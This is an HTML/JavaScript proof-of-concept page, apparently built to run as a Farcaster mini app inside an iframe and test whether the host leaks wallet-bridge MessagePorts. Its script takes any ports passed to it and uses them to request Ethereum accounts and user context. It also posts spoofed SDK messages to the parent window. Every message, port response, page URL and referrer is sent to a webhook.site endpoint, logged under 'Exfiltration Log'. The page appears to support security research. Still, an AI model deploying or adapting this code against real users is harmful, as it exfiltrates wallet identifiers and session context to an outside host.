<!doctype html>
<html>
	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<title>Security PoC</title>
		<style>
			* {
				margin: 0;
				padding: 0;
				box-sizing: border-box;
			}
			body {
				font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
				background: #17101f;
				color: #fff;
				padding: 16px;
				min-height: 100vh;
				font-size: 13px;
			}
			.banner {
				background: #dc2626;
				color: white;
				padding: 10px;
				border-radius: 8px;
				margin-bottom: 16px;
				font-weight: bold;
				text-align: center;
			}
			.card {
				background: #1e1529;
				border: 1px solid #2a2035;
				border-radius: 10px;
				padding: 12px;
				margin-bottom: 12px;
			}
			.card h3 {
				color: #a855f7;
				margin-bottom: 6px;
				font-size: 13px;
			}
			.card pre {
				color: #ccc;
				font-size: 11px;
				word-break: break-all;
				white-space: pre-wrap;
				background: #0d0912;
				padding: 8px;
				border-radius: 6px;
				margin-top: 4px;
				max-height: 300px;
				overflow-y: auto;
			}
			.pass {
				color: #4ade80;
			}
			.fail {
				color: #f87171;
			}
			.warn {
				color: #facc15;
			}
		</style>
	</head>
	<body>
		<div class="banner">⚠️ Farcaster Mini App — Wallet Bridge Port Transfer Test</div>

		<div class="card">
			<h3>🔌 MessagePort Transfers Received</h3>
			<pre id="port-log">Listening for port transfers...</pre>
		</div>

		<div class="card">
			<h3>💬 All Messages From Parent</h3>
			<pre id="msg-log">Waiting...</pre>
		</div>

		<div class="card">
			<h3>🔑 Wallet Bridge Responses</h3>
			<pre id="wallet-log">Waiting for wallet bridge...</pre>
		</div>

		<div class="card">
			<h3>📡 Exfiltration Log</h3>
			<pre id="exfil-log">Ready...</pre>
		</div>

		<script>
			var WEBHOOK = "https://webhook.site/4dda6ba6-a6b9-4bd9-af9c-9b4e1ef89c99";
			var portLog = [];
			var msgLog = [];
			var walletLog = [];
			var exfilLog = [];
			var receivedPorts = [];

			function updateUI() {
				document.getElementById("port-log").textContent = portLog.length > 0 ? JSON.stringify(portLog, null, 2) : "No ports received yet...";
				document.getElementById("msg-log").textContent = msgLog.length > 0 ? JSON.stringify(msgLog, null, 2) : "No messages yet...";
				document.getElementById("wallet-log").textContent = walletLog.length > 0 ? JSON.stringify(walletLog, null, 2) : "No wallet responses yet...";
				document.getElementById("exfil-log").textContent = exfilLog.join("\n") || "Ready...";
			}

			function sendToWebhook(label, data) {
				try {
					fetch(WEBHOOK, {
						method: "POST",
						mode: "no-cors",
						headers: { "Content-Type": "text/plain" },
						body: JSON.stringify({ label: label, data: data, ts: new Date().toISOString() }),
					});
					exfilLog.push("[" + new Date().toISOString().substring(11, 19) + "] Sent: " + label);
					updateUI();
				} catch (e) {}
			}

			// =============================================
			// CRITICAL: Listen for MessagePort transfers
			// Farcaster creates MessageChannels and may
			// transfer port2 to the mini app iframe
			// This gives direct wallet provider access
			// =============================================
			window.addEventListener("message", function (event) {
				var entry = {
					origin: event.origin,
					hasports: !!(event.ports && event.ports.length > 0),
					portCount: event.ports ? event.ports.length : 0,
					dataType: typeof event.data,
					dataPreview: JSON.stringify(event.data).substring(0, 500),
					timestamp: new Date().toISOString(),
				};
				msgLog.push(entry);

				// CRITICAL CHECK: Were MessagePorts transferred?
				if (event.ports && event.ports.length > 0) {
					portLog.push({
						portCount: event.ports.length,
						origin: event.origin,
						data: JSON.stringify(event.data).substring(0, 300),
						timestamp: new Date().toISOString(),
					});

					// Store the ports
					for (var i = 0; i < event.ports.length; i++) {
						receivedPorts.push(event.ports[i]);
						var portIndex = receivedPorts.length - 1;

						// Listen for messages on each received port
						(function (port, idx) {
							port.onmessage = function (portEvent) {
								var portMsg = {
									portIndex: idx,
									data: JSON.stringify(portEvent.data).substring(0, 500),
									timestamp: new Date().toISOString(),
								};
								walletLog.push(portMsg);
								sendToWebhook("PORT_MESSAGE_RECEIVED", portMsg);
								updateUI();
							};
							port.start();

							// Try requesting wallet data through the port
							try {
								// Try ethProvider requests
								port.postMessage({ jsonrpc: "2.0", id: 100 + idx, method: "eth_requestAccounts", params: [] });
								port.postMessage({ jsonrpc: "2.0", id: 200 + idx, method: "eth_accounts", params: [] });
								port.postMessage({ jsonrpc: "2.0", id: 300 + idx, method: "eth_chainId", params: [] });

								// Try init channel requests
								port.postMessage({ init: { type: "getContext" } });
								port.postMessage({ warpcast: { jsonrpc: "2.0", id: 400, method: "getContext" } });

								sendToWebhook("PORT_REQUESTS_SENT", { portIndex: idx, requests: ["eth_requestAccounts", "eth_accounts", "eth_chainId", "getContext"] });
							} catch (e) {
								sendToWebhook("PORT_REQUEST_ERROR", { portIndex: idx, error: e.message });
							}
						})(event.ports[i], portIndex);
					}

					sendToWebhook("PORTS_TRANSFERRED", {
						count: event.ports.length,
						origin: event.origin,
						data: JSON.stringify(event.data).substring(0, 300),
					});
				}

				sendToWebhook("message_received", entry);
				updateUI();
			});

			// =============================================
			// Try to initiate communication with parent
			// Using Farcaster Frame SDK message formats
			// =============================================

			// Signal ready - this is what legitimate mini apps do
			window.parent.postMessage({ type: "fc:frame:ready" }, "*");
			window.parent.postMessage({ type: "fc:frame:init" }, "*");

			// Try requesting context
			window.parent.postMessage({ type: "fc:frame:context:request" }, "*");
			window.parent.postMessage({ jsonrpc: "2.0", id: 1, method: "fc_requestContext" }, "*");

			// Try the Farcaster Actions SDK format
			window.parent.postMessage({ method: "ready" }, "*");
			window.parent.postMessage({ method: "actions.ready" }, "*");
			window.parent.postMessage({ method: "wallet.getEthereumProvider" }, "*");
			window.parent.postMessage({ method: "actions.signIn" }, "*");

			sendToWebhook("poc_started", {
				location: window.location.href,
				referrer: document.referrer,
				isFramed: window.self !== window.top,
				timestamp: new Date().toISOString(),
			});

			// Keep checking for delayed port transfers
			var checkCount = 0;
			var checker = setInterval(function () {
				checkCount++;
				if (checkCount > 30) {
					clearInterval(checker);
					return;
				}

				sendToWebhook("status_check", {
					second: checkCount,
					portsReceived: receivedPorts.length,
					totalMessages: msgLog.length,
					walletResponses: walletLog.length,
				});
				updateUI();
			}, 2000);
		</script>
	</body>
</html>
